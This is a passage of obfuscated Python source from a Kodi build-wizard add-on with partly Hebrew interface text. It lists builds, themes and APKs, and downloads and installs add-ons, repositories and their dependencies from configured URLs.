								addDir ('[%s] %s (v%s)'%(float (O000O0OOOO00OOOO0 ),O00OOOO0OOOO0O00O ,OO00O0OOOOO0O0OO0 ),'viewbuild',O00OOOO0OOOO0O00O ,description =O0OO0OO00OO0OO0OO ,fanart =OO00OO0O0OO0OO000 ,icon =OOOO000000OOOO0OO ,menu =O00000O00OOOO0O00 ,themeit =THEME2 )#line:2046
		elif O0000O000O00OO0O0 >0 :#line:2047
			if O0O0OO000O000000O >0 :#line:2048
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2049
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2050
			else :#line:2051
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2052
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2053
	setView ('files','viewType')#line:2054
def viewBuild (OO000O00O00OO0O0O ):#line:2056
	OOO00O0OOO00000O0 =wiz .workingURL (SPEEDFILE )#line:2057
	if not OOO00O0OOO00000O0 ==True :#line:2058
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2059
		addFile ('%s'%OOO00O0OOO00000O0 ,'',themeit =THEME3 )#line:2060
		return #line:2061
	if wiz .checkBuild (OO000O00O00OO0O0O ,'version')==False :#line:2062
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2063
		addFile ('%s was not found in the builds list.'%OO000O00O00OO0O0O ,'',themeit =THEME3 )#line:2064
		return #line:2065
	O0O0O0OOOO0O0OOO0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2066
	OOOOOO00O000OOO00 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OO000O00O00OO0O0O ).findall (O0O0O0OOOO0O0OOO0 )#line:2067
	for O0O00O0OO0000000O ,OO00OOOO0OO0O00OO ,O000OOO00000O0OO0 ,OO00000O0OOOO0OO0 ,OO0000O00000OO00O ,OO0OO0OO0O000O000 ,O0O0O0O00OOO0OOO0 ,OOO0OOOOOO000OOO0 ,O00OO00O0O00O0O0O ,O0OOO00OO0OO0OOOO in OOOOOO00O000OOO00 :#line:2068
		OO0OO0OO0O000O000 =OO0OO0OO0O000O000 if wiz .workingURL (OO0OO0OO0O000O000 )else ICON #line:2069
		O0O0O0O00OOO0OOO0 =O0O0O0O00OOO0OOO0 if wiz .workingURL (O0O0O0O00OOO0OOO0 )else FANART #line:2070
		OOOO0O0O0O0OOOO0O ='%s (v%s)'%(OO000O00O00OO0O0O ,O0O00O0OO0000000O )#line:2071
		if BUILDNAME ==OO000O00O00OO0O0O and O0O00O0OO0000000O >BUILDVERSION :#line:2072
			OOOO0O0O0O0OOOO0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OOOO0O0O0O0OOOO0O ,BUILDVERSION )#line:2073
		O0OO00OO000OO00OO =int (float (KODIV ));OO000OOOO000OOOOO =int (float (OO00000O0OOOO0OO0 ))#line:2082
		if not O0OO00OO000OO00OO ==OO000OOOO000OOOOO :#line:2083
			if O0OO00OO000OO00OO ==16 and OO000OOOO000OOOOO <=15 :OO00OO000O000OOOO =False #line:2084
			else :OO00OO000O000OOOO =True #line:2085
		else :OO00OO000O000OOOO =False #line:2086
		addFile ('התקנה','install',OO000O00O00OO0O0O ,'fresh',description =O0OOO00OO0OO0OOOO ,fanart =O0O0O0O00OOO0OOO0 ,icon =OO0OO0OO0O000O000 ,themeit =THEME1 )#line:2090
		if not OO0000O00000OO00O =='http://':#line:2093
			if wiz .workingURL (OO0000O00000OO00O )==True :#line:2094
				addFile (wiz .sep ('THEMES'),'',fanart =O0O0O0O00OOO0OOO0 ,icon =OO0OO0OO0O000O000 ,themeit =THEME3 )#line:2095
				O0O0O0OOOO0O0OOO0 =wiz .openURL (OO0000O00000OO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2096
				OOOOOO00O000OOO00 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0O0OOOO0O0OOO0 )#line:2097
				for OO0O0O000000OO0O0 ,O0OOO0O0000OO0OO0 ,O0O0OO0000OOO000O ,OOO00000OO0000000 ,O0000O0000OOO000O ,O0OOO00OO0OO0OOOO in OOOOOO00O000OOO00 :#line:2098
					if not SHOWADULT =='true'and O0000O0000OOO000O .lower ()=='yes':continue #line:2099
					O0O0OO0000OOO000O =O0O0OO0000OOO000O if O0O0OO0000OOO000O =='http://'else OO0OO0OO0O000O000 #line:2100
					OOO00000OO0000000 =OOO00000OO0000000 if OOO00000OO0000000 =='http://'else O0O0O0O00OOO0OOO0 #line:2101
					addFile (OO0O0O000000OO0O0 if not OO0O0O000000OO0O0 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0O0O000000OO0O0 ,'theme',OO000O00O00OO0O0O ,OO0O0O000000OO0O0 ,description =O0OOO00OO0OO0OOOO ,fanart =OOO00000OO0000000 ,icon =O0O0OO0000OOO000O ,themeit =THEME3 )#line:2102
	setView ('files','viewType')#line:2103
def viewThirdList (OO0OOO0O0OO00OO0O ):#line:2105
	OOO00000O00OO00OO =eval ('THIRD%sNAME'%OO0OOO0O0OO00OO0O )#line:2106
	OO0O0OO0OO00O000O =eval ('THIRD%sURL'%OO0OOO0O0OO00OO0O )#line:2107
	O0O0O0OOOO000000O =wiz .workingURL (OO0O0OO0OO00O000O )#line:2108
	if not O0O0O0OOOO000000O ==True :#line:2109
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2110
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2111
	else :#line:2112
		O00OO0OOO0O00OOOO ,O0O000OOO0OO0000O =wiz .thirdParty (OO0O0OO0OO00O000O )#line:2113
		addFile ("[B]%s[/B]"%OOO00000O00OO00OO ,'',themeit =THEME3 )#line:2114
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2115
		if O00OO0OOO0O00OOOO :#line:2116
			for OOO00000O00OO00OO ,O0OO0000O0O00OO0O ,OO0O0OO0OO00O000O ,O0O0O0OO000OOO00O ,OO0O00OO000O0O000 ,O0OOO0OO0OO00O0OO ,OOO0O00O00OOO000O ,O00OO0O000OOOO000 in O0O000OOO0OO0000O :#line:2117
				if not SHOWADULT =='true'and OOO0O00O00OOO000O .lower ()=='yes':continue #line:2118
				addFile ("[%s] %s v%s"%(O0O0O0OO000OOO00O ,OOO00000O00OO00OO ,O0OO0000O0O00OO0O ),'installthird',OOO00000O00OO00OO ,OO0O0OO0OO00O000O ,icon =OO0O00OO000O0O000 ,fanart =O0OOO0OO0OO00O0OO ,description =O00OO0O000OOOO000 ,themeit =THEME2 )#line:2119
		else :#line:2120
			for OOO00000O00OO00OO ,OO0O0OO0OO00O000O ,OO0O00OO000O0O000 ,O0OOO0OO0OO00O0OO ,O00OO0O000OOOO000 in O0O000OOO0OO0000O :#line:2121
				addFile (OOO00000O00OO00OO ,'installthird',OOO00000O00OO00OO ,OO0O0OO0OO00O000O ,icon =OO0O00OO000O0O000 ,fanart =O0OOO0OO0OO00O0OO ,description =O00OO0O000OOOO000 ,themeit =THEME2 )#line:2122
def editThirdParty (OOO0O0OO0OO0OO0O0 ):#line:2124
	O00O00O0OOO00OOOO =eval ('THIRD%sNAME'%OOO0O0OO0OO0OO0O0 )#line:2125
	OO0O0O0O0O000O0O0 =eval ('THIRD%sURL'%OOO0O0OO0OO0OO0O0 )#line:2126
	OOOOOOO0OO0OOO0OO =wiz .getKeyboard (O00O00O0OOO00OOOO ,'Enter the Name of the Wizard')#line:2127
	OO0000O0OO0OOOO00 =wiz .getKeyboard (OO0O0O0O0O000O0O0 ,'Enter the URL of the Wizard Text')#line:2128
	wiz .setS ('wizard%sname'%OOO0O0OO0OO0OO0O0 ,OOOOOOO0OO0OOO0OO )#line:2130
	wiz .setS ('wizard%surl'%OOO0O0OO0OO0OO0O0 ,OO0000O0OO0OOOO00 )#line:2131
def apkScraper (name =""):#line:2133
	if name =='kodi':#line:2134
		O0O0O0OO00OOOOOOO ='http://mirrors.kodi.tv/releases/android/arm/'#line:2135
		OO000OOO00O0OO00O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2136
		OOOOO00OOO00O0O0O =wiz .openURL (O0O0O0OO00OOOOOOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2137
		OOOOO0OO0O0OOOOOO =wiz .openURL (OO000OOO00O0OO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2138
		O0000O0O0OO000O0O =0 #line:2139
		O00O00O000O0OOO0O =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOOO00OOO00O0O0O )#line:2140
		OOOOO0OO0000O0000 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OOOOO0OO0O0OOOOOO )#line:2141
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2143
		OO0O0000OOO0O00OO =False #line:2144
		for OOO0O0O0O0O00OO0O ,name ,OOOOOOO0O0OOOO0O0 ,O0O00OO0O00000OO0 in O00O00O000O0OOO0O :#line:2145
			if OOO0O0O0O0O00OO0O in ['../','old/']:continue #line:2146
			if not OOO0O0O0O0O00OO0O .endswith ('.apk'):continue #line:2147
			if not OOO0O0O0O0O00OO0O .find ('_')==-1 and OO0O0000OOO0O00OO ==True :continue #line:2148
			try :#line:2149
				O00OO00O0O00000OO =name .split ('-')#line:2150
				if not OOO0O0O0O0O00OO0O .find ('_')==-1 :#line:2151
					OO0O0000OOO0O00OO =True #line:2152
					OO0OOO0O00O00OO0O ,OOOOOOO0OOO0OOO0O =O00OO00O0O00000OO [2 ].split ('_')#line:2153
				else :#line:2154
					OO0OOO0O00O00OO0O =O00OO00O0O00000OO [2 ]#line:2155
					OOOOOOO0OOO0OOO0O =''#line:2156
				O0O000OO00O00O000 ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00O0O00000OO [0 ].title (),O00OO00O0O00000OO [1 ],OOOOOOO0OOO0OOO0O .upper (),OO0OOO0O00O00OO0O ,COLOR2 ,OOOOOOO0O0OOOO0O0 .replace (' ',''),COLOR1 ,O0O00OO0O00000OO0 )#line:2157
				OOO00OO00O000O0OO =urljoin (O0O0O0OO00OOOOOOO ,OOO0O0O0O0O00OO0O )#line:2158
				addFile (O0O000OO00O00O000 ,'apkinstall',"%s v%s%s %s"%(O00OO00O0O00000OO [0 ].title (),O00OO00O0O00000OO [1 ],OOOOOOO0OOO0OOO0O .upper (),OO0OOO0O00O00OO0O ),OOO00OO00O000O0OO )#line:2159
				O0000O0O0OO000O0O +=1 #line:2160
			except :#line:2161
				wiz .log ("Error on: %s"%name )#line:2162
		for OOO0O0O0O0O00OO0O ,name ,OOOOOOO0O0OOOO0O0 ,O0O00OO0O00000OO0 in OOOOO0OO0000O0000 :#line:2164
			if OOO0O0O0O0O00OO0O in ['../','old/']:continue #line:2165
			if not OOO0O0O0O0O00OO0O .endswith ('.apk'):continue #line:2166
			if not OOO0O0O0O0O00OO0O .find ('_')==-1 :continue #line:2167
			try :#line:2168
				O00OO00O0O00000OO =name .split ('-')#line:2169
				O0O000OO00O00O000 ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00O0O00000OO [0 ].title (),O00OO00O0O00000OO [1 ],O00OO00O0O00000OO [2 ],COLOR2 ,OOOOOOO0O0OOOO0O0 .replace (' ',''),COLOR1 ,O0O00OO0O00000OO0 )#line:2170
				OOO00OO00O000O0OO =urljoin (OO000OOO00O0OO00O ,OOO0O0O0O0O00OO0O )#line:2171
				addFile (O0O000OO00O00O000 ,'apkinstall',"%s v%s %s"%(O00OO00O0O00000OO [0 ].title (),O00OO00O0O00000OO [1 ],O00OO00O0O00000OO [2 ]),OOO00OO00O000O0OO )#line:2172
				O0000O0O0OO000O0O +=1 #line:2173
			except :#line:2174
				wiz .log ("Error on: %s"%name )#line:2175
		if O0000O0O0OO000O0O ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2176
	elif name =='spmc':#line:2177
		OO0OOOO0O00OOO000 ='https://github.com/koying/SPMC/releases'#line:2178
		OOOOO00OOO00O0O0O =wiz .openURL (OO0OOOO0O00OOO000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2179
		O0000O0O0OO000O0O =0 #line:2180
		O00O00O000O0OOO0O =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OOOOO00OOO00O0O0O )#line:2181
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2183
		for name ,OO0O000O0O0000O00 in O00O00O000O0OOO0O :#line:2185
			OO00OOOO0OOO00O00 =''#line:2186
			OOOOO0OO0000O0000 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (OO0O000O0O0000O00 )#line:2187
			for OO0OOOOO0000O00O0 ,OO0OO00000OO0OO0O ,OOO00OOOOOO000OO0 in OOOOO0OO0000O0000 :#line:2188
				if OOO00OOOOOO000OO0 .find ('armeabi')==-1 :continue #line:2189
				if OOO00OOOOOO000OO0 .find ('launcher')>-1 :continue #line:2190
				OO00OOOO0OOO00O00 =urljoin ('https://github.com',OO0OOOOO0000O00O0 )#line:2191
				break #line:2192
		if O0000O0O0OO000O0O ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2194
def apkMenu (url =None ):#line:2196
	if url ==None :#line:2197
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2200
	if not APKFILE =='http://':#line:2201
		if url ==None :#line:2202
			OO000OOOO0O0O000O =wiz .workingURL (APKFILE )#line:2203
			O0O0000OO00OOOOO0 =uservar .APKFILE #line:2204
		else :#line:2205
			OO000OOOO0O0O000O =wiz .workingURL (url )#line:2206
			O0O0000OO00OOOOO0 =url #line:2207
		if OO000OOOO0O0O000O ==True :#line:2208
			O00O0OOOOO00OOO0O =wiz .openURL (O0O0000OO00OOOOO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2209
			O0O0O00OOO0OOO000 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O0OOOOO00OOO0O )#line:2210
			if len (O0O0O00OOO0OOO000 )>0 :#line:2211
				OOO00O00OO0O00000 =0 #line:2212
				for OO0000O0000O0O000 ,O0OO00000O0O0000O ,url ,O0O00O0OOO0OOOO00 ,OO0O0O000000O00O0 ,OO0O0O0O0OOOOO0O0 ,OO0OOO00OOOO00OO0 in O0O0O00OOO0OOO000 :#line:2213
					if not SHOWADULT =='true'and OO0O0O0O0OOOOO0O0 .lower ()=='yes':continue #line:2214
					if O0OO00000O0O0000O .lower ()=='yes':#line:2215
						OOO00O00OO0O00000 +=1 #line:2216
						addDir ("[B]%s[/B]"%OO0000O0000O0O000 ,'apk',url ,description =OO0OOO00OOOO00OO0 ,icon =O0O00O0OOO0OOOO00 ,fanart =OO0O0O000000O00O0 ,themeit =THEME3 )#line:2217
					else :#line:2218
						OOO00O00OO0O00000 +=1 #line:2219
						addFile (OO0000O0000O0O000 ,'apkinstall',OO0000O0000O0O000 ,url ,description =OO0OOO00OOOO00OO0 ,icon =O0O00O0OOO0OOOO00 ,fanart =OO0O0O000000O00O0 ,themeit =THEME2 )#line:2220
					if OOO00O00OO0O00000 <1 :#line:2221
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2222
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2223
		else :#line:2224
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2225
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2226
			addFile ('%s'%OO000OOOO0O0O000O ,'',themeit =THEME3 )#line:2227
		return #line:2228
	else :wiz .log ("[APK Menu] No APK list added.")#line:2229
	setView ('files','viewType')#line:2230
def addonMenu (url =None ):#line:2232
	if not ADDONFILE =='http://':#line:2233
		if url ==None :#line:2234
			O0O0OOO000O000000 =wiz .workingURL (ADDONFILE )#line:2235
			O0OO000O0O0000OO0 =uservar .ADDONFILE #line:2236
		else :#line:2237
			O0O0OOO000O000000 =wiz .workingURL (url )#line:2238
			O0OO000O0O0000OO0 =url #line:2239
		if O0O0OOO000O000000 ==True :#line:2240
			O0O0O0OO000000000 =wiz .openURL (O0OO000O0O0000OO0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2241
			O000OOO000OO00O0O =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0O0OO000000000 )#line:2242
			if len (O000OOO000OO00O0O )>0 :#line:2243
				OO0OOO0OOO0OO0000 =0 #line:2244
				for OO00000O0000O0OO0 ,O0OOOO0OO0O000O00 ,url ,O000O0O00O000OO00 ,OO0OO0O0OO00O0O00 ,OO00O0O00OOO00OO0 ,OOO00OOOOO000OO0O ,O00O00000O0O0O000 ,O0OO0O0OOO0OO0O00 ,O00OOO0OO000O0OOO in O000OOO000OO00O0O :#line:2245
					if O0OOOO0OO0O000O00 .lower ()=='section':#line:2246
						OO0OOO0OOO0OO0000 +=1 #line:2247
						addDir ("[B]%s[/B]"%OO00000O0000O0OO0 ,'addons',url ,description =O00OOO0OO000O0OOO ,icon =OOO00OOOOO000OO0O ,fanart =O00O00000O0O0O000 ,themeit =THEME3 )#line:2248
					else :#line:2249
						if not SHOWADULT =='true'and O0OO0O0OOO0OO0O00 .lower ()=='yes':continue #line:2250
						try :#line:2251
							O0OO0O00O00OOO0O0 =xbmcaddon .Addon (id =O0OOOO0OO0O000O00 ).getAddonInfo ('path')#line:2252
							if os .path .exists (O0OO0O00O00OOO0O0 ):#line:2253
								OO00000O0000O0OO0 ="[COLOR green][Installed][/COLOR] %s"%OO00000O0000O0OO0 #line:2254
						except :#line:2255
							pass #line:2256
						OO0OOO0OOO0OO0000 +=1 #line:2257
						addFile (OO00000O0000O0OO0 ,'addoninstall',O0OOOO0OO0O000O00 ,O0OO000O0O0000OO0 ,description =O00OOO0OO000O0OOO ,icon =OOO00OOOOO000OO0O ,fanart =O00O00000O0O0O000 ,themeit =THEME2 )#line:2258
					if OO0OOO0OOO0OO0000 <1 :#line:2259
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2260
			else :#line:2261
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2262
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2263
		else :#line:2264
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2265
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2266
			addFile ('%s'%O0O0OOO000O000000 ,'',themeit =THEME3 )#line:2267
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2268
	setView ('files','viewType')#line:2269
def addonInstaller (O000O000O00O00OOO ,O0OO0OOO00000O00O ):#line:2271
	if not ADDONFILE =='http://':#line:2272
		OOO0OOO000000OO0O =wiz .workingURL (O0OO0OOO00000O00O )#line:2273
		if OOO0OOO000000OO0O ==True :#line:2274
			O0O00O00OO0O0O00O =wiz .openURL (O0OO0OOO00000O00O ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2275
			OO0OOOOO00OO0O00O =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O000O000O00O00OOO ).findall (O0O00O00OO0O0O00O )#line:2276
			if len (OO0OOOOO00OO0O00O )>0 :#line:2277
				for O00O000O0O0OO0O00 ,O0OO0OOO00000O00O ,OO0O0000000O00O00 ,O0OOO0OOO00O00O0O ,O00OOO000O00O0000 ,O0000000O00O0OO0O ,OOO0OO0O00OO0O000 ,O00O0O0O0OO0OOO00 ,OO00O00O000OOOO00 in OO0OOOOO00OO0O00O :#line:2278
					if os .path .exists (os .path .join (ADDONS ,O000O000O00O00OOO )):#line:2279
						OO0O00O0OOOOOO00O =['Launch Addon','Remove Addon']#line:2280
						O00OOO000O00OOO0O =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,OO0O00O0OOOOOO00O )#line:2281
						if O00OOO000O00OOO0O ==0 :#line:2282
							wiz .ebi ('RunAddon(%s)'%O000O000O00O00OOO )#line:2283
							xbmc .sleep (1000 )#line:2284
							return True #line:2285
						elif O00OOO000O00OOO0O ==1 :#line:2286
							wiz .cleanHouse (os .path .join (ADDONS ,O000O000O00O00OOO ))#line:2287
							try :wiz .removeFolder (os .path .join (ADDONS ,O000O000O00O00OOO ))#line:2288
							except :pass #line:2289
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O000O000O00O00OOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2290
								removeAddonData (O000O000O00O00OOO )#line:2291
							wiz .refresh ()#line:2292
							return True #line:2293
						else :#line:2294
							return False #line:2295
					O0OOO0OOOO00000O0 =os .path .join (ADDONS ,OO0O0000000O00O00 )#line:2296
					if not OO0O0000000O00O00 .lower ()=='none'and not os .path .exists (O0OOO0OOOO00000O0 ):#line:2297
						wiz .log ("Repository not installed, installing it")#line:2298
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O000O000O00O00OOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0O0000000O00O00 ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2299
							O0O000OOO0OOO0000 =wiz .parseDOM (wiz .openURL (O0OOO0OOO00O00O0O ),'addon',ret ='version',attrs ={'id':OO0O0000000O00O00 })#line:2300
							if len (O0O000OOO0OOO0000 )>0 :#line:2301
								OO0OO0OOO0OOO000O ='%s%s-%s.zip'%(O00OOO000O00O0000 ,OO0O0000000O00O00 ,O0O000OOO0OOO0000 [0 ])#line:2302
								wiz .log (OO0OO0OOO0OOO000O )#line:2303
								if KODIV >=17 :wiz .addonDatabase (OO0O0000000O00O00 ,1 )#line:2304
								installAddon (OO0O0000000O00O00 ,OO0OO0OOO0OOO000O )#line:2305
								wiz .ebi ('UpdateAddonRepos()')#line:2306
								wiz .log ("Installing Addon from Kodi")#line:2308
								OO00OO0O0OO0OOO0O =installFromKodi (O000O000O00O00OOO )#line:2309
								wiz .log ("Install from Kodi: %s"%OO00OO0O0OO0OOO0O )#line:2310
								if OO00OO0O0OO0OOO0O :#line:2311
									wiz .refresh ()#line:2312
									return True #line:2313
							else :#line:2314
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO0O0000000O00O00 )#line:2315
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O000O000O00O00OOO ,OO0O0000000O00O00 ))#line:2316
					elif OO0O0000000O00O00 .lower ()=='none':#line:2317
						wiz .log ("No repository, installing addon")#line:2318
						O00O0000OOO00OO0O =O000O000O00O00OOO #line:2319
						O0OOO0OO0OOOOO00O =O0OO0OOO00000O00O #line:2320
						installAddon (O000O000O00O00OOO ,O0OO0OOO00000O00O )#line:2321
						wiz .refresh ()#line:2322
						return True #line:2323
					else :#line:2324
						wiz .log ("Repository installed, installing addon")#line:2325
						OO00OO0O0OO0OOO0O =installFromKodi (O000O000O00O00OOO ,False )#line:2326
						if OO00OO0O0OO0OOO0O :#line:2327
							wiz .refresh ()#line:2328
							return True #line:2329
					if os .path .exists (os .path .join (ADDONS ,O000O000O00O00OOO )):return True #line:2330
					O000O0000OO00OOOO =wiz .parseDOM (wiz .openURL (O0OOO0OOO00O00O0O ),'addon',ret ='version',attrs ={'id':O000O000O00O00OOO })#line:2331
					if len (O000O0000OO00OOOO )>0 :#line:2332
						O0OO0OOO00000O00O ="%s%s-%s.zip"%(O0OO0OOO00000O00O ,O000O000O00O00OOO ,O000O0000OO00OOOO [0 ])#line:2333
						wiz .log (str (O0OO0OOO00000O00O ))#line:2334
						if KODIV >=17 :wiz .addonDatabase (O000O000O00O00OOO ,1 )#line:2335
						installAddon (O000O000O00O00OOO ,O0OO0OOO00000O00O )#line:2336
						wiz .refresh ()#line:2337
					else :#line:2338
						wiz .log ("no match");return False #line:2339
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2340
		else :wiz .log ("[Addon Installer] Text File: %s"%OOO0OOO000000OO0O )#line:2341
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2342
def installFromKodi (OOO0OO0000000OOO0 ,over =True ):#line:2344
	if over ==True :#line:2345
		xbmc .sleep (2000 )#line:2346
	wiz .ebi ('RunPlugin(plugin://%s)'%OOO0OO0000000OOO0 )#line:2348
	if not wiz .whileWindow ('yesnodialog'):#line:2349
		return False #line:2350
	xbmc .sleep (1000 )#line:2351
	if wiz .whileWindow ('okdialog'):#line:2352
		return False #line:2353
	wiz .whileWindow ('progressdialog')#line:2354
	if os .path .exists (os .path .join (ADDONS ,OOO0OO0000000OOO0 )):return True #line:2355
	else :return False #line:2356
def installAddon (O00OOO00OOO0000OO ,O0O00OO00000OOO00 ):#line:2358
	if not wiz .workingURL (O0O00OO00000OOO00 )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O00OOO00OOO0000OO ,COLOR2 ));return #line:2359
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2360
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO00OOO0000OO ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2361
	O00OO00O0OO0O0000 =O0O00OO00000OOO00 .split ('/')#line:2362
	OO0OO0O0OOO00000O =os .path .join (PACKAGES ,O00OO00O0OO0O0000 [-1 ])#line:2363
	try :os .remove (OO0OO0O0OOO00000O )#line:2364
	except :pass #line:2365
	downloader .download (O0O00OO00000OOO00 ,OO0OO0O0OOO00000O ,DP )#line:2366
	OOOO0OO00OOOOO0OO ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00OOO00OOO0000OO )#line:2367
	DP .update (0 ,OOOO0OO00OOOOO0OO ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2368
	O0OO00O0OOO000O0O ,OOOOO00O00OOOO0OO ,OO0OOOO00O000000O =extract .all (OO0OO0O0OOO00000O ,ADDONS ,DP ,title =OOOO0OO00OOOOO0OO )#line:2369
	DP .update (0 ,OOOO0OO00OOOOO0OO ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2370
	installed (O00OOO00OOO0000OO )#line:2371
	installDep (O00OOO00OOO0000OO ,DP )#line:2372
	DP .close ()#line:2373
	wiz .ebi ('UpdateAddonRepos()')#line:2374
	wiz .ebi ('UpdateLocalAddons()')#line:2375
	wiz .refresh ()#line:2376
def installDep (O00O0000OOO0OO00O ,DP =None ):#line:2378
	OOOOO000OOO0O00OO =os .path .join (ADDONS ,O00O0000OOO0OO00O ,'addon.xml')#line:2379
	if os .path .exists (OOOOO000OOO0O00OO ):#line:2380
		O0OO000OOOO0OO0OO =open (OOOOO000OOO0O00OO ,mode ='r');OO0O0OOO0OOOO00O0 =O0OO000OOOO0OO0OO .read ();O0OO000OOOO0OO0OO .close ();#line:2381
		O0OO0O000000O0O00 =wiz .parseDOM (OO0O0OOO0OOOO00O0 ,'import',ret ='addon')#line:2382
		for O00OO0000OOO00OOO in O0OO0O000000O0O00 :#line:2383
			if not 'xbmc.python'in O00OO0000OOO00OOO :#line:2384
				if not DP ==None :#line:2385
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00OO0000OOO00OOO ))#line:2386
				wiz .createTemp (O00OO0000OOO00OOO )#line:2387
def installed (O0OO0O00O0O0O0O0O ):#line:2414
	O00O0OOO0OO00OO00 =os .path .join (ADDONS ,O0OO0O00O0O0O0O0O ,'addon.xml')#line:2415
